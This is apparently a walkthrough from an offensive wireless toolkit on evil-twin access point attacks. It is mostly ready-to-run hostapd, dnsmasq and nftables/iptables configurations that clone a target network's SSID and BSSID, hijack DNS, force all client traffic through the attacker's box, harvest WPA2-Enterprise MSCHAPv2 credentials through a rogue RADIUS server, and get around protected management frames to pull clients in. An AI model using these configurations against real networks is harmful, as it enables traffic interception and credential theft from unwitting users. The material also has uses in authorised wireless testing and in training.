# Evil twin — walkthrough

Two modes: match the RF, or match the RF *and* the association handshake.
The first is enough for cred-capture via captive portal. The second is
what you need when the target's supplicant validates the PMK against
its stored profile.

## Preconditions

- Target AP identified: SSID, BSSID, channel, security posture (RSN IE).
- Pineapple with hostapd (or hostapd-mana / hostapd-wpe for variants).
- Optional: matching Vendor-IE signature if the target's supplicant
  fingerprints APs.

## Path A — Open / captive-portal evil twin (WCTF classic)

```
cat > /tmp/twin.conf <<EOF
interface=wlan1
driver=nl80211
ssid=CorporateGuest
bssid=aa:bb:cc:dd:ee:ff        # clone of target
hw_mode=g
channel=6
country_code=US
ieee80211d=1
ignore_broadcast_ssid=0
auth_algs=1
# no wpa= line — open network
EOF
hostapd /tmp/twin.conf &

# DHCP + DNS via dnsmasq (or the Pineapple's built-in stack)
cat > /tmp/dnsmasq.conf <<EOF
interface=wlan1
dhcp-range=172.16.42.10,172.16.42.250,12h
dhcp-option=6,172.16.42.1     # DNS = us
address=/#/172.16.42.1        # every hostname resolves to us
EOF
dnsmasq -C /tmp/dnsmasq.conf

# Then bring up the captive-portal HTTP server (evil-portal module
# or nginx with a login template).
```

### 5 GHz variant — Mark VII's MT7615 second radio

Path A above is 2.4 GHz only. The Mark VII has a 5 GHz radio; use
UNII-1 (36/40/44/48) to avoid the DFS CAC dwell entirely.

```
# hostapd config for 5 GHz rogue (channel 36, UNII-1, no DFS)
interface=wlan1
ssid=<target ssid>
hw_mode=a
channel=36
country_code=US
ieee80211d=1
ieee80211n=1
ieee80211ac=1
vht_oper_chwidth=1
vht_oper_centr_freq_seg0_idx=42
wpa=2
wpa_key_mgmt=WPA-PSK
wpa_passphrase=<guess or the real one>
rsn_pairwise=CCMP
```

### NAT redirect (force intercept when client hard-codes IPs)

dnsmasq alone doesn't help when a client hard-codes `1.1.1.1` for DNS
or an IP for HTTPS. Force everything through the box:

```
# nftables (Kali/Debian default)
nft add table ip nat
nft add chain ip nat prerouting { type nat hook prerouting priority -100 \; }
nft add chain ip nat postrouting { type nat hook postrouting priority 100 \; }
nft add rule ip nat prerouting iifname wlan1 udp dport 53 dnat to 172.16.42.1:53
nft add rule ip nat prerouting iifname wlan1 tcp dport 80 dnat to 172.16.42.1:80
nft add rule ip nat prerouting iifname wlan1 tcp dport 443 dnat to 172.16.42.1:443
nft add rule ip nat postrouting oifname eth0 masquerade
echo 1 > /proc/sys/net/ipv4/ip_forward

# iptables fallback
iptables -t nat -A PREROUTING -i wlan1 -p udp --dport 53  -j DNAT --to 172.16.42.1:53
iptables -t nat -A PREROUTING -i wlan1 -p tcp --dport 80  -j DNAT --to 172.16.42.1:80
iptables -t nat -A PREROUTING -i wlan1 -p tcp --dport 443 -j DNAT --to 172.16.42.1:443
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
```

Point clients at your rogue by:

1. Broadcast deauth off the real AP (if not PMF-required).
2. Match your rogue on RSSI (Pineapple's second antenna helps).
3. Karma / probe response so any probing client sees "their" SSID.
   See `pineap/walkthrough.md`.

## Path B — WPA2-PSK evil twin (need the PSK)

```
cat > /tmp/twin.conf <<EOF
interface=wlan1
driver=nl80211
ssid=CorpWiFi
bssid=aa:bb:cc:dd:ee:ff
hw_mode=g
channel=6
country_code=US
ieee80211d=1
wpa=2
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
wpa_passphrase=<the-known-PSK>
ieee80211w=0                  # match target: 0 for legacy, 1 optional, 2 required
EOF
hostapd /tmp/twin.conf
```

Once a client associates, its traffic transits you. Also useful for
validating a *candidate* PSK — a wrong passphrase yields a 4-way M2
that never completes (KCK MIC fails).

## Path C — WPA2-Enterprise evil twin (harvest EAP)

For enterprise, the AP-side is the *authenticator*, not the auth
server. Point hostapd at a local hostapd-wpe or freeradius-wpe.

```
cat > /tmp/twin.conf <<EOF
interface=wlan1
ssid=CorporateEAP
hw_mode=g
channel=6
country_code=US
ieee80211d=1
wpa=2
wpa_key_mgmt=WPA-EAP
ieee8021x=1
auth_server_addr=127.0.0.1
auth_server_port=1812
auth_server_shared_secret=whocares
EOF
# Then run hostapd-wpe alongside — it logs MSCHAPv2 chal/resp pairs.
```

See `hostapd-wpe/reference.md` and `eaphammer/reference.md` for the
higher-level orchestrators.

## Vendor-IE matching (when the twin is spotted)

Some 2024+ enterprise supplicants fingerprint APs on Vendor-IE order.
Match:

```
# In hostapd — extract from a legitimate beacon capture:
tshark -r legit.pcapng -Y "wlan.fc.type_subtype == 8" -c 1 \
       -T fields -e wlan.tag.oui -e wlan.tag.number

# Then in hostapd.conf, use vendor_elements= to inject matching bytes:
vendor_elements=dd0900037f01010000ff7f
```

## Failure modes

- **PMF-required + no downgrade.** Deauth can't push clients. Rely on
  RSSI and natural roams.
- **BSSID collision detected by driver.** Some driver stacks refuse to
  bring up an AP with a BSSID they can already hear. Move to a
  different channel, or clone a BSSID that differs by one bit.
- **Client sees the mismatch and refuses.** Cert pinning, MDM
  profile, or Vendor-IE fingerprint mismatch. Path C with a matching
  cert or Vendor-IE payload.

## What still works when PMF-required

The evil-twin flow above assumes you can push clients off the real
AP with deauth. When the real AP is PMF-required (or on 6 GHz),
the push step is gone, but the evil twin itself still works — you
just have to attract clients instead of shoving them:

- **Beat the target on RSSI.** PMF has nothing to say about signal
  strength. Position your rogue closer to the victim (Pineapple's
  second antenna + directional gain), and clients that support
  BSS-Transition will roam to you on their own. Path A/B/C above
  all work; only the "deauth clients off first" step drops out.
- **KARMA + Known Beacons.** These trigger on the client's own
  probe-and-associate flow, not on a deauth. See
  `karma-family/walkthrough.md`. A probing client that hasn't
  associated to the real AP yet doesn't care about PMF at all.
- **Cert-phish for enterprise clients (Path C).** If the target
  supplicant has weak cert validation, a rogue-RADIUS twin
  harvests MSCHAPv2 on first-associate — no deauth needed. Wait
  for the STA to come up cold, or to fail over from the real AP
  during a legitimate outage / roam.
- **BTM Request forced roam.** Some vendors accept unauthenticated
  Category 10 (WNM) BTM Request Action frames; the client
  cooperates in its own move to your rogue. See
  `ctf/pmf-required-targets.md` §4.
- **Natural reassoc wait.** Clients periodically re-scan and
  re-select. A twin louder than the target eventually wins,
  especially at band edges or on frequency-limited 6 GHz.
- **FT / OKC key-material capture** on the real AP still yields a
  hashcat-22000 hash for offline crack even when you can't force
  the reassoc — the FT reassoc frames flow naturally as clients
  roam between BSSs in the same mobility domain.

## Cite

- hostapd configuration reference (w1.fi).
- SensePost 2014 — MANA.
- IEEE Std 802.11-2020, §11.34 (PMF), §11.10 (BSS Transition).
- attacks.json: `evil-twin-clone`, `captive-portal-cred-capture`,
  `btm-forced-roam`, `mana-known-beacons`.
